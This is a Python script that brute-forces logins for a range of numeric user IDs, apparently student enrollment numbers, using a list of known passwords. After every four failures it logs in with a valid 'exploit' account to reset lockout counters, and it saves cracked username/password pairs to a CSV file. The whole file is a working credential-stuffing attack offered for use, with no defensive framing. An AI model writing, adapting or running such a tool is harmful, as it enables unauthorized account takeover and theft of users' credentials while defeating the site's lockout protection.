import pandas as pd
import os
import dotenv
import time

dotenv.load_dotenv()
expoit_id = os.getenv("EXPLOIT_ID")
expoit_pass = os.getenv("EXPLOIT_PASS")

from login import login
from logout import logout

from known_pass import known_passwords

def main():

    def _perform_reset_login_attempt(user_to_login, pwd_to_login):
        print(f"Attempting to reset login state by logging in with user: {user_to_login}")
        try:
            login_failed, _ = login([{"username": user_to_login, "password": pwd_to_login}])
            if not login_failed:
                print("Correct credentials login successful (part of reset).")
                try:
                    logout_status = logout({"username": user_to_login, "password": pwd_to_login})
                    if logout_status is True:
                        print("Logged out after correct credentials login (part of reset).")
                    else:
                        print(f"Warning: Logout during reset attempt returned: {logout_status}")
                except Exception as e_logout_reset:
                    print(f"Warning: Error during logout in reset attempt: {e_logout_reset}")
                return True  
            else:
                print("Correct credentials login failed (part of reset).")
                return False 
        except Exception as e_reset:
            print(f"Error during reset login attempt: {e_reset}")
            return False 

    curr_dir = os.getcwd()
    csv_file_path = os.path.join(curr_dir, "matched.csv")

    wrong_attempts = 0
    found_credentials_list = [] 

    ids_to_try = [enroll for enroll in range(21102001, 22102184)] # + [enroll for enroll in range(21103001, 21103344)]

    try: 
        for user_id_to_try in ids_to_try:
            user_id_str = str(user_id_to_try)
            for password_attempt in known_passwords:
                # Prevent timeout due to too many bad login attempts
                if wrong_attempts >= 4: 
                    print(f"Reached {wrong_attempts} wrong attempts. Attempting to reset login state.")
                    wrong_attempts = 0 
                    if not _perform_reset_login_attempt(expoit_id, expoit_pass):
                        print("FATAL: Failed to reset login state. Exiting to prevent permanent lockout.")
                        return 
                    else:
                        print("Login state reset successfully. Continuing attempts.")
                
                print(f"Attempting login for User ID: {user_id_str}, Password: {password_attempt}")

                try:
                    login_failed_brute, _ = login([{"username": user_id_str, "password": password_attempt}])
                    login_successful = not login_failed_brute 

                    if login_successful:
                        print(f"SUCCESS: Login successful for User ID: {user_id_str} with Password: {password_attempt}")
                        
                        try:
                            logout_status_exploit = logout({"username": expoit_id, "password": expoit_pass})
                            if logout_status_exploit is True:
                                print(f"Logged out user '{expoit_id}' after successful brute-force.")
                            else:
                                print(f"Warning: Error or non-true status during logout of '{expoit_id}': {logout_status_exploit}")
                        except Exception as e_logout:
                            print(f"Warning: Error during logout of '{expoit_id}': {e_logout}")

                        found_credentials_list.append({'username': user_id_str, 'password': password_attempt})
                        print(f"Credentials User ID: {user_id_str}, Password: {password_attempt} recorded.")
                        
                        break 
                    
                    else: 
                        print(f"Login failed for User ID: {user_id_str}, Password: {password_attempt}")
                        wrong_attempts += 1

                except Exception as e_login_attempt:
                    print(f"Error during login attempt for User ID: {user_id_str}, Password: {password_attempt}: {e_login_attempt}")
                    wrong_attempts += 1

                print("Pausing for 45 seconds after login attempt...")
                time.sleep(45)
        
        print("Finished all attempts for all specified User IDs.")

    except Exception as e_unexpected: 
        print(f"FATAL: An unexpected error occurred during the process: {e_unexpected}")
    finally: 
        if found_credentials_list:
            print(f"\nAttempting to save {len(found_credentials_list)} found credentials to {csv_file_path}...")
            try:
                df = pd.DataFrame(found_credentials_list) 
                file_exists = os.path.exists(csv_file_path)
                write_header = not file_exists or (file_exists and os.path.getsize(csv_file_path) == 0)
                
                df.to_csv(csv_file_path, mode='a', header=write_header, index=False, encoding='utf-8')
                print(f"Successfully saved/appended credentials to {csv_file_path}")
            except IOError as e_csv:
                print(f"FATAL: CSV file error when writing with pandas ({csv_file_path}): {e_csv}")
            except Exception as e_pandas_write:
                 print(f"FATAL: An unexpected error occurred during pandas CSV writing: {e_pandas_write}")
        else:
            print("No new credentials found to save in this session.")

if __name__ == "__main__":
    main()
